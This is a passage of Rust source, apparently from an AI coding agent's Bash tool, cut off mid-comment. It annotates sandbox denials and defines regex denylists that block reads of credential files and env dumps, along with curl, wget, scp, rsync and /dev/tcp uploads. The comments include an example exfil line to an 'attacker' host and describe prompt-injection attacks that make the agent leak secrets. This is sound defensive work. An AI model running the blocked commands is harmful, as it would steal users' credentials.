//! Bash command policy classification and denylists (F20-03 Task 2 split).

use std::path::{Path, PathBuf};
use std::sync::OnceLock;

use regex::RegexSet;
use wcore_sandbox::NetworkPolicy;
use wcore_sandbox::manifest::SandboxManifest;
use wcore_types::tool::ToolResult;

/// Does `command` look like it needs network egress? Used only to attach a
/// helpful hint when such a command FAILS under the no-network sandbox — a
/// false positive merely appends an explanation to an already-failed result,
/// so the match can be liberal.
pub(super) fn looks_network_dependent(command: &str) -> bool {
    let c = command.to_lowercase();
    const NEEDLES: &[&str] = &[
        "curl ",
        "curl\t",
        "wget ",
        "git fetch",
        "git clone",
        "git pull",
        "git push",
        "git remote",
        "npm install",
        "npm i ",
        "npm ci",
        "npx ",
        "pnpm ",
        "yarn ",
        "pip install",
        "pip3 install",
        "cargo install",
        "cargo fetch",
        "cargo update",
        "brew ",
        "apt ",
        "apt-get",
        "nc ",
        "ncat",
        "telnet",
        "ssh ",
        "scp ",
        "rsync ",
        "ping ",
        "dig ",
        "nslookup",
        "host ",
        "ftp ",
        "http://",
        "https://",
    ];
    NEEDLES.iter().any(|n| c.contains(n))
}

/// The filesystem scope the OS sandbox was actually built from, captured
/// before the [`SandboxCommand`](wcore_sandbox::SandboxCommand) is consumed by
/// the backend, so a failed command can be attributed to a real policy
/// decision rather than guessed at.
#[derive(Debug, Clone, Default)]
pub(super) struct SandboxScope {
    /// The child's working directory — needed because tools report denied
    /// paths RELATIVE to it (`fatal: unable to access '.git/config'`).
    cwd: Option<PathBuf>,
    /// `manifest.fs_read_deny` — paths the policy explicitly denies.
    deny: Vec<PathBuf>,
    /// `fs_read_allow` ∪ `fs_write_allow` — every root the manifest granted.
    allow: Vec<PathBuf>,
}

impl SandboxScope {
    pub(super) fn new(manifest: &SandboxManifest, cwd: Option<&Path>) -> Self {
        let mut allow = manifest.fs_read_allow.clone();
        allow.extend(manifest.fs_write_allow.iter().cloned());
        Self {
            cwd: cwd.map(Path::to_path_buf),
            deny: manifest.fs_read_deny.clone(),
            allow,
        }
    }

    /// True when the manifest carried no FS scoping at all (no policy attached,
    /// or `NoSandboxBackend`): nothing can be attributed, so stay silent.
    fn is_unscoped(&self) -> bool {
        self.deny.is_empty() && self.allow.is_empty()
    }
}

/// The path syntax a prefix is written in. The two need different comparison
/// rules — Windows is case-insensitive, accepts `/` and `\` interchangeably,
/// and carries a `\\?\` verbatim decoration that POSIX has no equivalent for —
/// so the syntax travels with the prefix instead of being inferred.
#[derive(Clone, Copy)]
enum PathSyntax {
    Posix,
    Windows,
}

/// Prefixes every supported backend grants unconditionally as part of process
/// bootstrap (see `sandbox_exec::build_profile` / `bwrap` ro-binds). A path
/// under one of these is NOT evidence of a policy denial, so it must never be
/// reported as one. `/var`, `/tmp` and `/private` are deliberately ABSENT:
/// macOS grants those three only as `literal` symlink nodes, not as subpaths,
/// so `$TMPDIR/...` really is outside the sandbox.
///
/// Both spellings are live on every host rather than being `cfg`-selected. A
/// Windows-spelled prefix cannot collide with a real POSIX path (`C:\…` is not
/// a spelling a POSIX tool emits, and vice versa), the only consequence of a
/// match is SILENCE — this annotation's safe direction — and keeping them live
/// is what lets the Windows rule be exercised by the test suite on Linux and
/// macOS instead of only on the one platform CI cannot introspect.
const ALWAYS_GRANTED_PREFIXES: &[(PathSyntax, &str)] = &[
    (PathSyntax::Windows, r"C:\Windows"),
    (PathSyntax::Windows, r"C:\Program Files"),
    (PathSyntax::Posix, "/usr"),
    (PathSyntax::Posix, "/bin"),
    (PathSyntax::Posix, "/sbin"),
    (PathSyntax::Posix, "/dev"),
    (PathSyntax::Posix, "/etc"),
    (PathSyntax::Posix, "/opt"),
    (PathSyntax::Posix, "/System"),
    (PathSyntax::Posix, "/Library"),
    (PathSyntax::Posix, "/proc"),
    (PathSyntax::Posix, "/sys"),
    (PathSyntax::Posix, "/nix"),
];

/// True when `path` names `prefix`, or something under it, in POSIX syntax.
fn posix_path_is_under(path: &str, prefix: &str) -> bool {
    // Only an ABSOLUTE path can be under an absolute system prefix: a relative
    // `usr/local/thing` inside the workspace is not `/usr`.
    if !path.starts_with('/') {
        return false;
    }
    let mut actual = path.split('/').filter(|c| !c.is_empty());
    prefix
        .split('/')
        .filter(|c| !c.is_empty())
        .all(|want| actual.next() == Some(want))
}

/// True when `path` names `prefix`, or something under it, in Windows syntax.
///
/// [`Path::starts_with`] cannot do this job. `canonicalize` hands back the
/// VERBATIM spelling of a Windows path (`\\?\C:\Windows\…`, whose prefix
/// component is `VerbatimDisk('C')`) while the constants above are written in
/// the ordinary form (`C:\Windows`, prefix component `Disk('C')`), and `Path`
/// compares prefix KINDS: `VerbatimDisk('C') != Disk('C')`, so the comparison
/// could never fire and every genuine `System32` path was reported as a sandbox
/// denial. Normalising is the fix, not a second constant — the verbatim form is
/// a decoration on the same path, not a different one:
///
/// * drop the `\\?\` decoration from both sides;
/// * treat `/` and `\` alike, because Windows accepts both and its tools emit
///   both (`C:/Windows/System32/…` from git, node, python; `C:\…` from cmd);
/// * compare component-by-component and case-insensitively, because NTFS is
///   case-insensitive and a component-wise compare is what stops
///   `C:\Windowsfoo` from matching `C:\Windows`.
fn windows_path_is_under(path: &str, prefix: &str) -> bool {
    fn components(s: &str) -> impl Iterator<Item = &str> {
        // `\\?\UNC\server\share` keeps its `UNC` component after the strip; it
        // then fails to match any drive-rooted prefix, which is the safe
        // direction (a UNC path is attributed exactly as it was before).
        s.strip_prefix(r"\\?\")
            .unwrap_or(s)
            .split(['\\', '/'])
            .filter(|c| !c.is_empty())
    }
    let mut actual = components(path);
    components(prefix).all(|want| {
        actual
            .next()
            .is_some_and(|got| got.eq_ignore_ascii_case(want))
    })
}

/// True when `path` sits under a prefix the platform grants unconditionally,
/// in either spelling.
fn is_always_granted(path: &str) -> bool {
    ALWAYS_GRANTED_PREFIXES
        .iter()
        .any(|(syntax, prefix)| match syntax {
            PathSyntax::Posix => posix_path_is_under(path, prefix),
            PathSyntax::Windows => windows_path_is_under(path, prefix),
        })
}

/// Why a path named in a failed command's output was unreachable.
#[derive(Debug, PartialEq, Eq)]
enum DeniedBecause {
    /// Explicitly listed in `manifest.fs_read_deny`.
    PolicyDeny,
    /// Not under any root the manifest granted.
    NotGranted,
}

/// Is this token path-shaped at all?
///
/// A false-positive token is NOT free, contrary to what the old rule assumed:
/// a token that reaches [`classify`] and lands outside the granted roots is
/// reported to the user as a sandbox denial. The old rule's `starts_with('/')`
/// arm therefore fabricated denials out of Windows command-line SWITCHES —
/// `/NOLOGO`, `/c`, `/t:Build` — which `classify` joined onto the child's cwd
/// (`\\?\D:\` + `/NOLOGO` = `\\?\D:\NOLOGO`) and the advisory then blamed the
/// sandbox for, recommending the user turn their sandbox OFF to fix a problem
/// that did not exist.
///
/// A switch has no separator INSIDE it; every real path shape does (`/a/b`,
/// `./a`, `a/b`). Requiring an interior separator drops the switches and keeps
/// the paths. It also drops a single-component absolute path (`/tmp`), which
/// costs only silence — this annotation's default and its safe direction —
/// whereas keeping it costs a fabricated accusation.
fn is_path_token(token: &str) -> bool {
    if token.len() < 2 || token.contains("://") {
        return false;
    }
    token.trim_start_matches('/').contains('/')
}

/// Pull the path-shaped tokens out of a tool result body. Deliberately crude:
/// the caller only trusts a token once it matches the manifest.
fn candidate_paths(body: &str, scope: &SandboxScope) -> Vec<String> {
    let raw: Vec<&str> = body
        .split(|c: char| c.is_whitespace() || c == '\'' || c == '"' || c == '`')
        .collect();

    let mut out: Vec<String> = Vec::new();
    let mut i = 0;
    while i < raw.len() {
        // Greedily prefer the LONGEST run of space-joined tokens that names
        // something real. `~/Library/Application Support/...` is one path, not
        // two, and every macOS desktop workspace lives under it — splitting it
        // produced two fragments that each looked ungranted, so the advisory
        // stated a falsehood about a file that was never out of reach.
        //
        // The filesystem is the arbiter, which is sound HERE specifically:
        // this runs in the parent process, outside the child's sandbox, so a
        // path that resolves for us really does exist.
        let mut best: Option<(usize, String)> = None;
        let limit = raw.len().min(i + MAX_SPACE_JOINED_TOKENS);
        for j in i..limit {
            let joined = trim_trailing_punctuation(&raw[i..=j].join(" "));
            if joined.is_empty() || !is_path_token(&joined) {
                continue;
            }
            if resolve_candidate(scope, &joined).is_some_and(|p| path_exists(&p)) {
                best = Some((j, joined));
            }
        }
        match best {
            Some((j, joined)) => {
                out.push(joined);
                i = j + 1;
            }
            None => {
                // Nothing real here. Keep the bare token so a genuinely denied
                // path that no longer exists on disk can still match the
                // deny-list, and let `classify` decide.
                let token = trim_trailing_punctuation(raw[i]);
                if is_path_token(&token) {
                    out.push(token);
                }
                i += 1;
            }
        }
    }
    out
}

/// Longest run of whitespace-separated tokens considered as one path.
///
/// Real directory names contain a space or two (`Application Support`,
/// `My Documents`); prose does not stop being prose for eight words running.
/// The bound also keeps this quadratic scan cheap on a large tool output.
const MAX_SPACE_JOINED_TOKENS: usize = 6;

fn trim_trailing_punctuation(token: &str) -> String {
    token
        .trim_end_matches([':', ',', '.', ';', ')', ']'])
        .to_string()
}

/// True only when the filesystem positively reports that something IS there.
///
/// The polarity matters, and an earlier version of this had it backwards. The
/// reassembly below needs POSITIVE evidence that a joined run of tokens names
/// a real path, not merely the absence of evidence that it does not. Those are
/// the same test only on a platform where every stat failure is `NotFound`.
/// Windows returns `InvalidInput` for a path containing characters no path may
/// contain, so a "not definitely absent" check accepted
/// `C:\w\repo\ STDERR: LoadLibrary failed for …` as an existing path and
/// glued half a log line into one fabricated token.
///
/// A stat that fails for ANY reason is not a path worth joining on.
fn path_exists(path: &Path) -> bool {
    std::fs::symlink_metadata(path).is_ok()
}

/// Resolve a token the way [`classify`] does — absolute as written, relative
/// against the child's cwd. Shared by the tokenizer so the two cannot drift
/// into disagreeing about what a token even names.
fn resolve_candidate(scope: &SandboxScope, token: &str) -> Option<PathBuf> {
    let raw = Path::new(token);
    if raw.is_absolute() {
        Some(raw.to_path_buf())
    } else {
        Some(
            scope
                .cwd
                .as_ref()?
                .join(raw.strip_prefix("./").unwrap_or(raw)),
        )
    }
}

/// Classify one path token against the scope. `None` means "no evidence this
/// path was blocked by the sandbox" — the default, so an unrelated failure is
/// never given a fabricated cause.
fn classify(scope: &SandboxScope, token: &str) -> Option<(PathBuf, DeniedBecause)> {
    let joined = resolve_candidate(scope, token)?;
    // Manifest roots are canonicalized by `WorkspacePolicy`, but a child names
    // whatever spelling it was given. On macOS the granted scratch root is
    // `/private/tmp/...` while the shell reports `/tmp/...`, so a prefix match on
    // the raw token would call a GRANTED path "outside every granted root" —
    // this annotation would then state a falsehood. Resolve first; a path that
    // does not exist keeps its literal spelling, which is the right answer for
    // the "no such file" case.
    let resolved = std::fs::canonicalize(&joined).unwrap_or(joined);
    if scope.deny.iter().any(|d| resolved.starts_with(d)) {
        return Some((resolved, DeniedBecause::PolicyDeny));
    }
    if scope.allow.iter().any(|a| resolved.starts_with(a)) {
        return None;
    }
    // Checked in BOTH spellings: as the child wrote it, and as it resolved.
    // The token as written is what carries a Windows drive path on a POSIX host
    // (where the join above turns it into nonsense under the cwd), and the
    // resolved form is what carries Windows' verbatim `\\?\` decoration.
    if is_always_granted(token) || is_always_granted(&resolved.to_string_lossy()) {
        return None;
    }
    Some((resolved, DeniedBecause::NotGranted))
}

/// When a sandboxed command FAILS and its output names a path this workspace's
/// policy actually put out of reach, say so.
///
/// B1 (`+GIT-SBX`): under the STRICT profile — the default for every workspace
/// that has not been trusted — `git` exits 128 on every invocation and the only
/// thing the user sees is
/// `fatal: unable to access '/Users/me/.gitconfig': Operation not permitted`,
/// which reads like their machine is broken. Three separate policy decisions
/// produce it (`$HOME/.gitconfig` is granted to the trusted profile but not the
/// strict one; `<root>/.git/config` is on the secret deny-list; `<root>/.git/objects`
/// is denied so `git log -p` cannot reconstruct a committed secret). The third is
/// load-bearing anti-exfiltration and CANNOT be widened — measured on macOS
/// seatbelt, `git status` / `diff` / `log` all need the object store, so there is
/// no profile edit that restores git without also restoring `git log -p`. The
/// denial therefore stays; what changes is that it is no longer mute.
///
/// Attribution is evidence-based, never guessed: a path is only named when it
/// matches this manifest's own deny-list or falls outside every root the
/// manifest granted.
pub(super) fn annotate_sandbox_denial(scope: &SandboxScope, mut result: ToolResult) -> ToolResult {
    if !result.is_error || scope.is_unscoped() {
        return result;
    }
    let mut denied: Vec<(PathBuf, DeniedBecause)> = Vec::new();
    for token in candidate_paths(&result.content, scope) {
        if let Some(hit) = classify(scope, &token)
            && !denied.iter().any(|(seen, _)| *seen == hit.0)
        {
            denied.push(hit);
        }
    }
    if denied.is_empty() {
        return result;
    }

    result.content.push_str(
        "\n\n⚠ The OS sandbox — not a broken machine and not a missing tool — put these \
         paths out of reach of this command:",
    );
    for (path, why) in &denied {
        let reason = match why {
            DeniedBecause::PolicyDeny => "explicitly denied by this workspace's policy",
            DeniedBecause::NotGranted => "outside every root granted to this workspace",
        };
        result
            .content
            .push_str(&format!("\n  • {} — {reason}", path.display()));
    }
    result.content.push_str(
        "\nThis workspace is running under the STRICT (untrusted) sandbox profile, which is \
         the default until a workspace is trusted.",
    );
    if scope
        .deny
        .iter()
        .any(|denied| denied.ends_with(".git/objects"))
    {
        result.content.push_str(
            " That profile also denies the git object store (`.git/objects`) so a committed \
             secret cannot be reconstructed with `git log -p` / `git show`. `git status`, \
             `diff`, `log` and `commit` all read that store, so no git command run from \
             Bash can succeed here — retrying will not help, and git is not broken or \
             missing. The `Git` TOOL is a different surface and is NOT sandboxed: use it \
             for status, diff, log, blame, add, commit, branch_checkout, push and \
             pr_create instead of shelling out to git.",
        );
    }
    // No clause here may forbid the model from reporting a cause: the W2/W3
    // sandbox gate measured such a clause suppressing the TRUE cause of a
    // failure while a false one was asserted elsewhere in the same message.
    result.content.push_str(
        "\nRemedy: run once with `--trust-workspace` in this directory to switch to the \
         trusted-local profile, or `--dangerously-skip-permissions-and-sandbox` to turn the \
         OS sandbox off entirely.",
    );
    result.is_error = true;
    result
}

/// Output substrings that mean the command really did reach for the network and
/// could not get there. Only these license the "egress is why it failed" claim.
const EGRESS_FAILURE_NEEDLES: &[&str] = &[
    "could not resolve host",
    "couldn't resolve host",
    "temporary failure in name resolution",
    "name or service not known",
    "nodename nor servname provided",
    "getaddrinfo",
    "enotfound",
    "eai_again",
    "network is unreachable",
    "enetunreach",
    "network is down",
    "no route to host",
    "ehostunreach",
    "connection refused",
    "econnrefused",
    "connection reset",
    "econnreset",
    "connection timed out",
    "etimedout",
    "failed to connect to",
    "couldn't connect to server",
    "could not connect to server",
    "failed to establish a new connection",
    // `unable to access` is GIT'S phrasing for two unrelated failures:
    //   fatal: unable to access 'https://github.com/o/r/': Could not resolve host
    //   warning: unable to access '.git/config': Permission denied
    // Only the first is egress. The bare needle claimed both, and because
    // network evidence wins outright it beat the `permission denied` on the
    // very same line — so the A-2 corpus row was told its `git remote get-url`
    // failed for want of a network when the OS sandbox had denied a local
    // file. Require the URL. The genuine remote failure still matches here AND
    // on its own `could not resolve host` / `failed to connect to` clause, so
    // narrowing this costs no true positive.
    "unable to access 'http",
    "unable to access \"http",
    "ssl connect error",
    "network-outbound",
];

/// Output substrings that name a cause which is NOT the network: a filesystem
/// denial (macOS seatbelt names the path, and bwrap / AppContainer surface one
/// of these too) or a refused process launch (Windows gives the NTSTATUS).
///
/// Checked only AFTER [`EGRESS_FAILURE_NEEDLES`], so a seatbelt socket denial
/// reported as `Failed to connect to …: Operation not permitted` still counts
/// as egress.
const NON_EGRESS_FAILURE_NEEDLES: &[&str] = &[
    // Filesystem denials.
    "operation not permitted",
    "permission denied",
    "access is denied",
    "eacces",
    "eperm",
    "read-only file system",
    "erofs",
    "deny file-read",
    "deny file-write",
    "outside sandbox root",
    "no such file or directory",
    "enoent",
    // Refused process launches. Windows AppContainer refuses every external
    // image with one of these; a POSIX shell reports the rest.
    "0xc0000142",
    "0xc0000135",
    "status_dll_init_failed",
    "status_dll_not_found",
    "is not recognized as an internal or external command",
    "exec format error",
    "cannot execute binary file",
];

/// What the failed command's own output says about WHY it failed.
#[derive(Debug, PartialEq, Eq)]
enum FailureEvidence {
    /// The output names a network failure.
    Egress,
    /// The output names a cause that is not the network. Carries the offending
    /// line verbatim, so the path macOS names and the NTSTATUS Windows gives
    /// both reach the model.
    NotEgress(String),
    /// The output names no cause at all (`curl -s`, a swallowed stderr).
    Silent,
}

/// Read the cause out of the command's own output.
///
/// Network evidence wins outright: a seatbelt socket denial reads
/// `curl: (7) Failed to connect to …: Operation not permitted`, which carries
/// both a network needle and a filesystem-shaped one, and it really is egress.
fn failure_evidence(body: &str) -> FailureEvidence {
    let mut not_egress: Option<String> = None;
    for line in body.lines() {
        let lower = line.to_lowercase();
        if EGRESS_FAILURE_NEEDLES.iter().any(|n| lower.contains(n)) {
            return FailureEvidence::Egress;
        }
        if not_egress.is_none() && NON_EGRESS_FAILURE_NEEDLES.iter().any(|n| lower.contains(n)) {
            not_egress = Some(line.trim().to_string());
        }
    }
    match not_egress {
        Some(line) => FailureEvidence::NotEgress(line),
        None => FailureEvidence::Silent,
    }
}

/// When a network-dependent command FAILS under a no-network sandbox, say what
/// actually stopped it.
///
/// This keeps the signal the annotation was written for: the silent
/// "empty output" failure (the 2026-05-31 curl-thrash bug) still gets an
/// actionable message, so the agent pivots to WebFetch / the `web` search tool
/// instead of retrying curl — and re-prompting for approval — in a loop.
///
/// What changed is where the cause comes from. It is read from the command's
/// OUTPUT and never guessed from the command string.
/// [`looks_network_dependent`] only decides whether this annotation has
/// anything to say at all; it cannot decide *why* the command failed, and the
/// revision that let it do so asserted egress on every failure of a
/// network-shaped command. Measured on macOS and Windows in the W2/W3 sandbox
/// gate: every failure observed there was a filesystem denial or a refused
/// process launch — several with the network untouched, including an
/// `npm install` of a `file:` dependency — and every one was told the network
/// was to blame. So:
///
/// * output names a network failure  → egress is stated as the cause;
/// * output names a different cause  → that cause is quoted and egress is
///   ruled out;
/// * output names nothing at all     → egress is offered as *one* possibility
///   beside the others, not asserted.
///
/// No branch may instruct the model not to report a cause. The removed clause
/// ("…do NOT claim… and do not invent any other cause") forbade reporting the
/// true cause while the false one was being asserted, which left an agent no
/// way to self-correct.
pub(super) fn annotate_network_block(
    command: &str,
    policy: NetworkPolicy,
    mut result: ToolResult,
) -> ToolResult {
    if !result.is_error
        || !matches!(policy, NetworkPolicy::Deny)
        || !looks_network_dependent(command)
    {
        return result;
    }
    match failure_evidence(&result.content) {
        FailureEvidence::Egress => result.content.push_str(
            "\n\n⚠ Bash network egress is OFF for this workspace (an untrusted / contained \
             workspace denies network to prevent data exfiltration), and this command's own \
             output reports a network failure — that is why it failed. To enable installs, \
             the user can run this on a trusted workspace or add an entry to `[security] \
             egress_allow` in their config file to approve egress (an environment variable \
             cannot approve it). To read a URL now, use the WebFetch tool; to search the web, \
             use the `web` tool with operation \"search\".",
        ),
        FailureEvidence::NotEgress(line) => result.content.push_str(&format!(
            "\n\n⚠ Cause: Bash network egress is OFF for this workspace, but egress is NOT \
             what stopped this command — its own output reports a different failure:\n  \
             {line}\nThat is the cause to report. A named path means the OS sandbox put that \
             path out of reach; a process-launch status (for example the Windows NTSTATUS \
             0xC0000142) means the program could not start under the sandbox at all. Neither \
             is fixed by retrying, and neither means the tool is missing from the machine."
        )),
        FailureEvidence::Silent => result.content.push_str(
            "\n\n⚠ Cause: this annotation could not determine why the command failed — its \
             output names neither a network failure nor a filesystem or process-launch \
             denial. Bash network egress is OFF for this workspace (an untrusted / contained \
             workspace denies network to prevent data exfiltration), which is one possible \
             cause; a filesystem denial or a refused process launch under the same sandbox \
             are others, and any note below this one about a specific denied path is better \
             evidence than this paragraph. Read the command's own error output above; if it \
             is empty, re-run with the tool's errors enabled (drop `-s` / `--quiet`, add \
             `-v`). If it is egress: the user can run this on a trusted workspace or add an \
             entry to `[security] egress_allow` in their config file to approve it (an \
             environment variable cannot approve it); to read a URL now, use the WebFetch \
             tool; to search the web, use the `web` tool with operation \"search\".",
        ),
    }
    result.is_error = true;
    result
}

/// Wave SA — Credential-exfiltration denylist for BashTool.
///
/// BashTool returns full stdout to the model, so a command that dumps
/// environment variables, reads a `.env` file, or echoes a named secret
/// places that data in the LLM's context window — from which an attacker
/// with prompt-injection control can exfiltrate it via subsequent tool
/// output / streaming. This is the MAJOR-class finding in v0.2.0 audit.
///
/// We refuse the obvious shapes BEFORE invoking the shell. This is
/// defense-in-depth; the real fix is config-storage hardening
/// (Wave SD's job — chmod 0600, OS keyring, etc.).
///
/// Patterns matched against the raw `command` string:
/// - bare `env` / `env <args>` / `printenv` / `printenv <args>`
/// - bare POSIX `set` (with no args dumps every shell var)
/// - PowerShell `Get-ChildItem env:` (forward-compat for Windows)
/// - `cat`/`tee`/`less`/`more`/`head`/`tail` of a `.env` file
/// - `echo $FOO_API_KEY` / `echo $FOO_SECRET` / `echo $FOO_TOKEN` /
///   `echo $FOO_PASSWORD` style env-var dereference
/// - `printenv FOO_API_KEY` / similar named-secret lookups
fn denylist() -> &'static RegexSet {
    static SET: OnceLock<RegexSet> = OnceLock::new();
    SET.get_or_init(|| {
        // (?i) = case insensitive throughout.
        // ^\s* lets us catch leading whitespace; (?m) is not needed
        // since we test the whole command string as a single line and
        // also do a per-line pass below.
        let patterns = &[
            // Bare `env` / `env <args>` (env-var dump or modify-env exec).
            r"(?i)^\s*env\s*$",
            r"(?i)^\s*env\s+",
            // Bare `printenv` / `printenv <args>` — prints all or named env vars.
            r"(?i)^\s*printenv\s*$",
            r"(?i)^\s*printenv\b",
            // POSIX `set` (no args) — prints all shell variables incl. exported.
            r"(?i)^\s*set\s*$",
            // PowerShell env enumeration (future Windows surface).
            r"(?i)Get-ChildItem\s+env:",
            r"(?i)\$env:[A-Z_]",
            // Reading .env files via common viewers.
            r"(?i)\b(cat|tee|less|more|head|tail)\b[^|;]*\.env(\b|$)",
            // `echo $FOO_API_KEY`, `echo $FOO_SECRET_KEY`, etc.
            r"(?i)\becho\b[^|;]*\$[A-Z_][A-Z_0-9]*_(API_KEY|SECRET|TOKEN|PASSWORD|PASSWD)",
            // `printenv FOO_API_KEY` / named-secret lookup variant
            // (covers the case where the leading `printenv\b` rule didn't
            // catch it because of an alternate denylist tightening).
            r"(?i)\bprintenv\s+[A-Z_][A-Z_0-9]*_(API_KEY|SECRET|TOKEN|PASSWORD|PASSWD)",

            // ── v0.6.1 hardening additions (Sec3) ──────────────────
            // Block reads of well-known credential files. Path-based
            // rather than env-var-based — closes the gap where an
            // attacker `cat`s the on-disk secret instead of echoing
            // an env var.
            r"(?i)\b(cat|less|more|head|tail|tee|bat)\b[^|;]*(\.git-credentials|\.aws/credentials|\.aws/config|\.ssh/id_[a-z0-9_]+|\.ssh/identity[^/]*|\.netrc|\.npmrc|\.pypirc|\.kube/config|\.gcloud/|\.azure/|\.config/wayland/auth|/etc/shadow|/etc/sudoers)",
            // Encoding-based exfil: base64/xxd/od/hexdump/uuencode of
            // credential files or .env. Closes the dodge where an
            // attacker base64s the secret to bypass a plain-read deny.
            r"(?i)\b(base64|xxd|od|hexdump|uuencode|openssl\s+enc)\b[^|;]*(\.git-credentials|\.aws/credentials|\.aws/config|\.ssh/id_[a-z0-9_]+|\.ssh/identity[^/]*|\.netrc|\.npmrc|\.pypirc|\.kube/config|\.gcloud/|\.azure/|\.config/wayland/auth|/etc/shadow|/etc/sudoers|\.env(\b|$))",
            // Linux procfs re-exposes this process's own environment as an
            // ordinary file, so `cat /proc/self/environ` is exactly the `env`
            // dump the first rule in this set refuses — reached by a path the
            // command-name rules never see. The Read tool denies this subtree
            // (`is_denied_proc_path`) and so now do Grep/Glob; without this
            // rule the boundary was enforced on three tools and walked around
            // with the fourth. Deny every per-process form (`self`,
            // `thread-self`, a literal pid) and any command that names it —
            // reader, encoder or interpreter — since nothing legitimate needs
            // this file. Other `/proc` entries (`cpuinfo`, `meminfo`) are
            // untouched.
            r"(?i)/proc/(self|thread-self|\d+)/environ",
            // macOS Keychain extraction via `security` CLI.
            r"(?i)\bsecurity\s+(find-generic-password|find-internet-password|dump-keychain|export)\b",
            // `compgen -e` enumerates exported env vars in bash.
            r"(?i)\bcompgen\s+-e\b",
            // Bash indirect / pattern expansion of env vars.
            r"\$\{!\w+",
            // `printf` and `awk`-based exfil that bypass the existing
            // `echo` rule.
            r"(?i)\bprintf\b[^|;]*\$[A-Z_][A-Z_0-9]*_(API_KEY|SECRET|TOKEN|PASSWORD|PASSWD)",
            r"(?i)\bawk\b[^|;]*ENVIRON",
            // `set -o posix; set` dumps shell vars even when normal
            // `set` is shadowed by an alias.
            r"(?i)^\s*set\s+-o\s+posix\s*;\s*set\s*$",
            // Reading our own credentials file by absolute path glob.
            r"(?i)/wayland(-core)?/(auth|credentials|tokens?)\.json",

            // ── F-056: language-runtime eval patterns ──────────────────────
            // These allow a model to embed arbitrary code in the command arg
            // and read credential files without triggering the cat/less rules.
            // We block the eval form + path pattern together to avoid
            // refusing all Python/Node use — only the dangerous combo.

            // python -c / python3 -c reading $HOME secret dirs.
            r#"(?i)\bpython[23]?\s+-[cC]\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // python -m pip show (fingerprints env / installed packages).
            r"(?i)\bpython[23]?\s+-m\s+pip\s+show\b",
            // node -e / node --eval reading $HOME secret dirs.
            r#"(?i)\bnode\s+(--eval|-e)\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // perl -e reading $HOME secret dirs.
            r#"(?i)\bperl\s+-e\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // ruby -e reading $HOME secret dirs.
            r#"(?i)\bruby\s+-e\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // php -r reading $HOME secret dirs.
            r#"(?i)\bphp\s+-r\s+.*(\$HOME|~|/Users/|/home/)[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
            // awk ENVIRON — reads any env var via the language's env table.
            r"(?i)\bawk\b.*\bENVIRON\b",
            // bash -c ... $HOME reading cred dirs (shell inception with path).
            r#"(?i)\bbash\s+-c\s+.*\$HOME[^'"]*(/\.aws|/\.ssh|/\.gnupg|/\.config/wayland|/\.wayland)"#,
        ];
        // SAFETY: `patterns` is a static array of literal regex
        // strings exercised by the bash_credential_exfil_test suite
        // (Wave SA). A failure here would be a checked-in-source
        // bug caught before release.
        RegexSet::new(patterns).expect("Wave SA denylist regex set must compile")
    })
}

/// #673 — network data-EXFIL denylist (distinct from the credential-READ set
/// above). Now that a Trusted workspace runs Bash with network egress on
/// (#657), a prompt-injected command can `curl --data-binary @secret
/// https://attacker` local data straight off-box. This flags the shapes that
/// UPLOAD a local file / stdin to a remote host, while deliberately NOT
/// touching plain downloads or literal-data POSTs (so installs and normal API
/// calls — the reason #657 turned egress back on — keep working).
///
/// Defense-in-depth, not a boundary: an attacker has unbounded obfuscation.
/// The precise-first-line defense remains the secret-scrubbed sandbox env; this
/// raises the cost of the obvious one-liner exfil. A host-allowlist that would
/// *permit* uploads to configured-trusted hosts is a deliberate follow-up (it
/// needs the sandbox per-host-rule surface + a config knob).
///
/// Precision note: the `@` file-reference is matched only at a value START
/// (after the flag/space/quote, or right after `=`), so an EMAIL address
/// (`field=user@host`) in a literal `-d`/`-F` value does NOT trip it.
fn network_exfil_denylist() -> &'static RegexSet {
    static SET: OnceLock<RegexSet> = OnceLock::new();
    SET.get_or_init(|| {
        let patterns = &[
            // curl: explicit local-file upload flags. `-T\s*\S` catches the
            // glued short form (`-Tdump.sql`) as well as `-T dump.sql`.
            r"(?i)\bcurl\b[^|;]*\s(-T\s*\S|--upload-file)",
            // curl: a data/form flag whose value READS A LOCAL FILE via `@`
            // (`-d @f`, `-d@f`, `--data-binary @f`, `-F name=@f`,
            // `--data-urlencode name@f`). `\s*` allows the glued short form.
            // The `@` is anchored to a value START: either the value has no `=`
            // before the `@` (`@f`, `name@f`) — first alt — or the `@` sits right
            // after `=` (`name=@f`) — second alt. A literal email value
            // (`-d 'to=a@b.com'`, where `=` precedes the `@`) matches NEITHER.
            // The single-letter flags are CASE-SENSITIVE (`(?-i:…)`) so `-f`
            // (`--fail`) and `-D` (`--dump-header`) — different flags — do NOT
            // match `-F`/`-d`; that would refuse a legit `curl -f https://tok@host`.
            r#"(?i)\bcurl\b[^|;]*\s(?:(?-i:-d|-F)|--data[a-z-]*|--form)\s*['"]?([^\s'"|;=]*@|[^\s'"|;]*=@)"#,
            // wget: post a local file / read the body from a file.
            r"(?i)\bwget\b[^|;]*\s(--post-file|--body-file)\b",
            // httpie: a field that reads a local file — both the "embed file as
            // string" form (`field=@f`) and httpie's canonical multipart UPLOAD
            // form, a BARE `@` (`field@/path`). Anchored to the START of the
            // command/piece as `http`/`https` + space (the httpie invocation
            // `http URL ...`), which excludes a `http(s)://` URL (where `http` is
            // followed by `:`). The bare-`@` alt requires a filepath char
            // (`~`/`.`/`/`) after `@`, so a URL's userinfo `user:pass@host` (host,
            // not a path char, and the `:` breaks the field-name run) is NOT hit.
            r"(?i)^\s*https?\s+[^|;]*(=@|\s[\w.-]+@[~./])",
            // scp: any transfer touching a remote `host:path` (up or down — the
            // upload direction is the exfil; a download false-positive is safe).
            r"(?i)\bscp\b[^|;]*\s[\w.@-]+:[^\s]",
            // rsync: a transfer touching a remote `host:`/`user@host:` target.
            r"(?i)\brsync\b[^|;]*\s[\w.@-]+:[^\s]",
            // bash /dev/tcp|/dev/udp pseudo-device — a shell-native network
            // socket used purely for exfil (`cat f > /dev/tcp/host/port`); it has
